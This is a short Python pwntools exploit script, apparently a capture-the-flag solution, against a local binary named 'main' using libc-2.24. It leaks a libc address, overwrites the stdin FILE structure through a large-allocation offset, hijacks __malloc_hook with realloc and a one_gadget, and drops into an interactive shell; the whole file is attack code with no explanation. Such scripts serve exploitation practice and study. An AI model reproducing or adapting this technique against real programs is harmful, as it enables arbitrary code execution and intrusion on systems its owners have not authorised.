from pwn import*
#context.log_level ='DEBUG'
p = process('./main')
libc =ELF('./libc-2.24.so')
p.sendafter('leave your name, bro:','FMYYSSSS')
p.recvuntil('FMYYSSSS')
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 515410
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0xF1651
realloc = libc_base + libc.sym['realloc']
log.info('LIBC:\t' + hex(libc_base))
off = 0x201000 -0x10  + libc.sym['_IO_2_1_stdin_'] + 7*8
p.sendlineafter('stackoverflow:',str(off))
log.info('OFFSET\t' + hex(off))
p.sendlineafter('stackoverflow:',str(0x200000))
p.sendlineafter('ropchain','FMYY')
p.sendafter('stackoverflow', p64(malloc_hook + 8))
for i in range(8):
	p.sendline('\x00')
payload = p64(malloc_hook + 8) + p64(0)*6
payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0)
payload += p64(libc_base + 3946352) + p64(0xFFFFFFFFFFFFFFFF)
payload += p64(0) + p64(libc_base + 3938720)
payload += p64(0)*3 + p64(0xFFFFFFFF)
payload += p64(0)*2 + p64(libc_base + 3924992)
payload += '\x00'*304
payload += p64(libc_base + 3923648) + p64(0)*2
payload += p64(one_gadget) + p64(realloc)
p.sendline(payload)
p.interactive()
